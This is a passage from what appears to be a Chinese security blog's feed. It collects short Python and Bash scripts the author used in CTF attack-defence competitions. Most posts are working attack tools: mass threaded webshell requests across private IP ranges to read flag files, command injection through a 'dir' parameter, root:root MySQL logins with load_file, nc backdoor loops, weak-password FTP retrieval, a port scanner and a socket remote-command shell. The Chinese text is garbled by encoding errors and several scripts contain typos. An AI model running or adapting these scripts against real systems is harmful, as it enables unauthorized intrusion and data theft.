      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell/</url>
      
        <content type="html"><![CDATA[<p>&lt;&gt;</p><a id="more"></a><pre><code class="language-Python">import requestsimport threadingflag = open(&quot;webshellsave.txt&quot;,&quot;a&quot;)def run(i):    ip=&quot;192.168.&quot;+str(i)+&quot;.128&quot;    url=&quot;http://&quot;+ip+&quot;/WebShell.php/&quot;    payload={'cmd':'cat /root/flag*.txt'}    try:        r = requests.get(url,payload,timeout=1)        flag.write(r.url+&quot;\n&quot;+r.text)        print(&quot;GET FLAG! &gt;&gt;&quot;,r.url,'\n',r.text)    except:        print(&quot;\nConnect Fail &gt;&gt;&quot;,url)for i in range(101,254):    t = threading.Thread(target=run, args=(i,))    t.start()</code></pre><p><em><strong>è½¬è½½è¯·æ ‡æ˜å‡ºå¤„</strong></em></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€PythonScriptã€‘:Web_Dirs_Scnnaer</title>
      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWeb_Dirs_Scanner/"/>
      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWeb_Dirs_Scanner/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-ä»‹ç»">0x00 ä»‹ç»</h1><p>çœ‹åˆ°ä¸€äº›webç›®å½•æ‰«æå™¨ã€‚è‡ªå·±ä¹Ÿå°è¯•å†™äº†ä¸€ä¸‹xD</p><a id="more"></a><pre><code class="language-Python">import requestsimport randomimport reuser_agent_list = [{'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.169 Safari/537.36'},]user_agent = random.choice(user_agent_list)target = input(&quot;target host &gt;&quot;)dict_path_file = input(&quot;dicr file &gt;&quot;)def CheckURLProtocol():    Check = re.match(r&quot;http?://&quot;,target)    if Check == None:        print(&quot;[-]Example: http://127.0.0.1 or https://127.0.0.1&quot;)        exit(0)    else:        with open(dict_path_file) as f:            for dic in f.readlines():                url = target + str(dic)                url = url.replace(&quot;\n&quot;,&quot;&quot;)                try:                    r = requests.get(url,headers=user_agent)                    if r.status_code == 200:                        print(r.url)                except:                    pass</code></pre><p><strong>è½¬è½½è¯·æ ‡æ˜å‡ºå¤„</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€PythonScriptã€‘:RemoteSocket_cmd</title>
      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACsocket_cmd%E8%BF%9E%E6%8E%A5/"/>
      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACsocket_cmd%E8%BF%9E%E6%8E%A5/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-ä»‹ç»">0x00 ä»‹ç»</h1><p>ä¸ºäº†ç»™å­¦å¼Ÿä¸Šå…¬å¼€è¯¾åˆ»æ„å†™äº†ä¸€ä¸ªè¿œæ§è„šæœ¬ï¼Œè™½ç„¶ä¸è¿™ä¹ˆè¡ŒxD</p><a id="more"></a><ul><li><strong>Server:</strong></li></ul><pre><code class="language-Python">import socket,osdef main():    global data, s    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)    s.bind(('127.0.0.1',10001))    s.listen(5)    print(&quot;ç­‰å¾…è¿æ¥ä¸­â€¦â€¦&quot;)    while True:        conn,addr = s.accept()        while True:            print('æ”¶åˆ°å‘½ä»¤')            data = conn.recv(1024)            cmd = os.popen(data.decode())            os_result = cmd.read()            conn.sendall(os_result.encode('utf8'))if __name__ == '__main__':    main()</code></pre><ul><li><strong>Client:</strong></li></ul><pre><code class="language-Python">import  socketServerIP=('127.0.0.1',10001)try:    s = socket.socket(socket.AF_INET,socket.SOCK_STREAM,0)    s.connect(ServerIP)    print('[+]è¿æ¥æˆåŠŸ')except:    print('[-]æœåŠ¡å™¨æ— å“åº”')    exit(0)while True:    data=input('[CMD]&gt;&gt;')    s.sendto(bytes(data,encoding='utf8'),ServerIP)    data = s.recv(1024)    print('[+]å›æ˜¾æˆåŠŸ')    print(data.decode())</code></pre><p><strong>è½¬è½½è¯·æ ‡æ˜å‡ºå¤„</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€PythonScriptã€‘:PyMySQL</title>
      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/"/>
      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACPyMySQL/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-ä»‹ç»">0x00 ä»‹ç»</h1><p>çªç„¶æƒ³èµ·æ¥MYSQLæ˜¯å¦ä¹Ÿèƒ½åšæˆè‡ªåŠ¨GETFALGè„šæœ¬å‘¢ã€‚</p><a id="more"></a><p>è¿™ä¸ªè¿˜æœ‰ç‚¹é—®é¢˜ã€‚å¯ä»¥è‡ªå·±ä¿®æ”¹ä¸‹:)</p><pre><code class="language-Python">import pymysqlimport threadingfile=open('MySQLsave.txt','w+')def mysql_login(i):    ip='192.168.'+str(i)+'101'    username='root'    password='root'    payload = &quot;SELECT load_file('C:/flag*.txt')&quot;    try:        db = pymysql.connect(ip,username,password,&quot;mysql&quot;)        cursor = db.cursor()        cursor.execute(payload)        data = cursor.fetchall()        print(data)    except:        passfor i in range(1,249):    t = threading.Thread(target=mysql, args=(i,))    t.start()</code></pre><p><strong>è½¬è½½è¯·æ ‡æ˜å‡ºå¤„</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€PythonScriptã€‘:PortScanner</title>
      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(PortScanner)/"/>
      <url>/2018/10/10/Python%E8%84%9A%E6%9C%AC%E7%AB%AF%E5%8F%A3%E6%89%AB%E6%8F%8F(PortScanner)/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-ä»‹ç»">0x00 ä»‹ç»</h1><p>åœ¨å®è®­å®¤æ— èŠçš„æ—¶å€™ï¼Œéšæ‰‹å†™äº†ä¸€ä¸‹ç«¯å£æ‰«æçš„Pythonè„šæœ¬.</p><a id="more"></a><pre><code class="language-Python">import socketimport threadingfile=open(&quot;port.txt&quot;,'w+')def portscan(port):    host='192.168.174.1'    try:        s = socket.socket(socket.AF_INET,socket.SOCK_STREAM)        conn=s.connect_ex((host,port))        if conn ==0:            print(&quot;HOST &gt; {} : OPEN : {}&quot;.format(host,post))            file.write(host+&quot;:&quot;+str(post)+&quot;\n&quot;)        else:            pass    excpet:        passfor port in range(1,65535):    t=threading.Thread(target=portscan, args=(port, ))    t.start()</code></pre><p><strong>è½¬è½½è¯·æ ‡æ˜å‡ºå¤„</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ã€PythonScriptã€‘:WebShell_urilb</title>
      <link href="/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/"/>
      <url>/2018/10/10/Python%E8%84%9A%E6%9C%ACWebShell_urilb/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-ä»‹ç»">0x00 ä»‹ç»</h1><p><strong>ä½¿ç”¨urlilbæ¨¡å—</strong></p><p><strong>åœ¨ä¸€äº›ç‰¹å®šçš„æ”»é˜²æ¯”èµ›ä¸­ï¼Œæ”»å‡»æœºæ²¡æœ‰å®‰è£…requestsæ¨¡å—ï¼Œåªèƒ½ä½¿ç”¨urlilbæ¨¡å—æ¥ä»£æ›¿</strong></p><a id="more"></a><pre><code class="language-Python">import urllib.parseimport urllib.requestimport threadingdef WebShell(i):    data = {&quot;dir&quot;: &quot;&amp;&amp; type flag.txt&quot;}    url = &quot;http://192.168.123.&quot;+str(i)+&quot;/DirCtrl.php&quot;    data_string=urllib.parse.urlencode(data)    new_url=url+&quot;?&quot;+data_string    try:        send = urllib.request.urlopen(new_url,timeout=1)        print(send.read().decode(&quot;utf8&quot;,&quot;ignore&quot;))    except:        passfor i in range(1,255):    t = threading.Thread(target=WebShell, args=(i, ))    t.start()</code></pre><p><strong>è½¬è½½è¯·æ ‡æ˜å‡ºå¤„</strong></p>]]></content>
      
      
      <categories>
          
          <category> Python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Python </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>BashScripts</title>
      <link href="/2018/10/09/Shell%E8%84%9A%E6%9C%AC/"/>
      <url>/2018/10/09/Shell%E8%84%9A%E6%9C%AC/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-ä»‹ç»">0x00 ä»‹ç»</h1><p>æˆ‘åœ¨å…¨å›½èŒä¸šæŠ€èƒ½å¤§èµ›æ¯”èµ›æ—¶æ‰€ç”¨çš„shellè„šæœ¬:</p><a id="more"></a><pre><code class="language-bash">ncåé—¨:port=10001 for i in `seq 101 254`;doip=&quot;192.168.2.&quot;$ipayload=`echo &quot;cat /root/flag*.txt;exit&quot; | nc $ip $port`done</code></pre><pre><code class="language-bash">webshell:or i in `seq 101 254`;doip=&quot;192.168.2.&quot;$icurl http://$ip/WebShell.php/?cmd=cat+%2Froot%2Fflag*.txtdone</code></pre><pre><code class="language-bash">ftp:username='admin'passwd='123456'for i in `seq 101 254`;doip=&quot;192.168.2.&quot;$ish ftpmain.sh $ip $username $passwd</code></pre><pre><code class="language-bash">#é…åˆftpä½¿ç”¨ftpmain:ftp $1 -invuser $2 $3get /root/flag*.txtbye!</code></pre><blockquote><p>æœ‰ä¸€äº›åœ°æ–¹å¾—æ³¨æ„æ”¹åŠ¨ï¼Œä»€ä¹ˆIPåœ°å€NCåé—¨çš„ç«¯å£FTPé‚£è¾¹çš„å¼±ç”¨æˆ·å¼±å¯†ç ä»€ä¹ˆçš„ç­‰ç­‰â€¦ã€‚<br>å°¤å…¶æ˜¯ä¸€äº›æ ‡ç‚¹ç¬¦å·çš„å°ç»†èŠ‚ä¸èƒ½å¿˜è®°ï¼Œè¯¥ç©ºæ ¼çš„åœ°æ–¹å°±å¾—ç©ºæ ¼ï¼Œæœ€å¥½å…ˆå®éªŒä¸€éåœ¨æ‹¿å»å®æˆ˜<br>è¿™äº›éƒ½å¯ä»¥æ‹¿åˆ°ä¸€äº›æ”»é˜²æ¯”èµ› å¦‚: CTFçš„AWD æˆ–è€…ä¸€äº› æŠ€èƒ½å¤§èµ›</p></blockquote><p><strong>è½¬è½½è¯·æ ‡æ˜å‡ºå¤„</strong></p>]]></content>
      
      
      <categories>
          
          <category> Bash </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Shell </tag>
            
        </tags>
      
    </entry>
    
    
  
  
</search>
